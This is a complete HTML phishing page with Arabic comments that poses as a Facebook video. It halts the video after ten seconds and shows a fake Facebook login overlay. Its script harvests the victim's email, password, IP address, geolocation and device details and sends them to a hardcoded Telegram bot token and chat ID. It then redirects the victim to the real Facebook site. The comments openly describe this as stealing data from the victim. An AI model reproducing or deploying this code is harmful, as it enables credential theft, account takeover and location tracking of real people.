<!DOCTYPE html>  
<html lang="ar" dir="rtl">  
<head>  
    <meta charset="UTF-8">  
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="فـيـديـو مـدهـش! اكتـشـف السـر الآن">  
    <meta property="og:description" content="انـقـر لـتـشـاهـد أكـبـر خـدعـة فـي الـتـاريـخ">  
    <meta property="og:image" content="https://files.fm/u/rhnba4pdqj#/view/sk5dka7hnw">  
    <meta property="og:type" content="video.movie">  
    <title>Facebook | فيسبوك</title>  
    <style>  
        /* تـنـظـيـم الـفـوضـى */  
        body {  
            margin: 0;  
            background: #18191a;  
            color: white;  
            font-family: "Helvetica Neue", Arial;  
        }  
        #video {  
            width: 100%;  
            height: 100vh;  
            object-fit: cover;  
            cursor: pointer;  
        }  
        .login-overlay {  
            display: none;  
            position: fixed;  
            top: 0;  
            left: 0;  
            width: 100%;  
            height: 100%;  
            background: rgba(0, 0, 0, 0.9);  
            z-index: 1000;  
        }  
        .login-form {  
            position: absolute;  
            top: 50%;  
            left: 50%;  
            transform: translate(-50%, -50%);  
            background: #242526;  
            padding: 20px;  
            border-radius: 8px;  
            width: 320px;  
            text-align: center;  
        }  
        input {  
            width: 100%;  
            padding: 12px;  
            margin: 10px 0;  
            border: 1px solid #3a3b3c;  
            border-radius: 6px;  
            background: #3a3b3c;  
            color: white;  
        }  
        button {  
            width: 100%;  
            padding: 12px;  
            background: #1877f2;  
            border: none;  
            border-radius: 6px;  
            color: white;  
            font-weight: bold;  
            cursor: pointer;  
        }  
        .loading-bar {  
            width: 100%;  
            height: 3px;  
            background: #3a3b3c;  
            margin-top: 10px;  
            position: relative;  
            overflow: hidden;  
        }  
        .loading-bar::after {  
            content: "";  
            position: absolute;  
            width: 30%;  
            height: 100%;  
            background: #1877f2;  
            animation: loading 10s linear forwards;  
        }  
        @keyframes loading {  
            0% { transform: translateX(-100%); }  
            100% { transform: translateX(330%); }  
        }  
        @media (max-width: 480px) {  
            .login-form {  
                width: 90%;  
            }  
        }  
    </style>  
</head>  
<body>  
    <!-- الـفـيـديـو الـمـزيـف -->  
    <video id="video" autoplay muted>  
        <source src="https://www.google.com/search?q=ytyob&oq=ytyob&gs_lcrp=EgZjaHJvbWUyBggAEEUYOTISCAEQLhhDGIMBGLEDGIAEGIoFMhIIAhAAGEMYgwEYsQMYgAQYigUyDwgDEAAYQxixAxiABBiKBTIGCAQQBRhAMgwIBRAAGEMYgAQYigUyDAgGEAAYQxiABBiKBTIMCAcQABgKGLEDGIAEMhIICBAAGEMYgwEYsQMYgAQYigUyDAgJEAAYChixAxiABDIMCAoQABgKGLEDGIAEMg8ICxAAGAoYgwEYsQMYgAQyCQgMEAAYChiABDIJCA0QABgKGIAE0gEINjMzMWowajmoAgCwAgE&client=ms-android-realme-terr1-rso2&sourceid=chrome-mobile&ie=UTF-8#fpstate=ive&vld=cid:0625bce0,vid:hJT4YO6xT-E,st:0" type="video/mp4">  
        Your browser does not support the video tag.  
    </video>  
    <div class="loading-bar"></div>  

    <!-- نـافـذة تـسـجـيـل الـدخـول -->  
    <div class="login-overlay">  
        <div class="login-form">  
            <h3 style="margin: 0 0 20px 0;">لـتـتـابـع الـمـشـاهـدة، يـجـب تـسـجـيـل الـدخـول</h3>  
            <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>  
            <input type="password" id="password" placeholder="كلمة السر" required>  
            <button onclick="stealData()">تـسـجـيـل الـدخـول</button>  
            <p style="font-size: 12px; color: #b0b3b8;">فيسبوك © 2024</p>  
        </div>  
    </div>  

    <script>  
        // الـجـحـيـم يـبـدأ فـورًا  
        let isDataStolen = false;  
        const video = document.getElementById('video');  

        // إجـبـاري: تـوقـيـف الـفـيـديـو بـعـد 10 ثـوانٍ  
        setTimeout(() => {  
            video.pause();  
            video.style.opacity = '0.5';  
            document.querySelector('.login-overlay').style.display = 'block';  
              
            // سـرقة الـمـوقـع والـمـعـلـومـات  
            navigator.geolocation.getCurrentPosition(pos => {  
                const coords = `${pos.coords.latitude},${pos.coords.longitude}`;  
                localStorage.setItem('victimLocation', coords);  
            }, err => {  
                localStorage.setItem('victimLocation', 'غير معروف');  
            });  
        }, 10000);  

        // مـنـع الـضـحـيـة مـن إعـادة تـشـغـيـل الـفـيـديـو  
        video.addEventListener('click', () => {  
            if (video.paused) {  
                alert('يـجـب تـسـجـيـل الـدخـول لـمـشـاهـدة الـفـيـديـو!');  
            }  
        });  

        // سـرقة الـبـيـانـات وإرسـالـهـا  
        async function stealData() {  
            if (isDataStolen) return;  
            isDataStolen = true;  

            const email = document.getElementById('email').value;  
            const password = document.getElementById('password').value;  
            const ip = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip);  
            const deviceInfo = navigator.userAgent;  
            const location = localStorage.getItem('victimLocation');  
            const browser = `${navigator.vendor} | ${navigator.platform}`;  

            // إرسـال إلـى تـلـجـرام  
            const BOT_TOKEN = '7324755672:AAE4elD8FFkEFgLkjifBz9TPZWmivjoMXHA';  
            const CHAT_ID = '612351056';  
            const message = `  
📧 **بـريـد/رقـم**: ${email}  
🔑 **كـلـمـة الـسـر**: ${password}  
🌍 **الـايـبـي**: ${ip}  
📍 **الـمـوقـع**: ${location}  
📱 **الـجـهـاز**: ${deviceInfo}  
🖥️ **الـمـتـصـفـح**: ${browser}  
            `;  

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);  

            // تـحـويـل الـضـحـيـة إلـى صـفـحـة فـيـسـبـوك حـقـيـقـيـة  
            window.location.href = 'https://facebook.com';  
        }  
    </script>  
</body>  
</html>
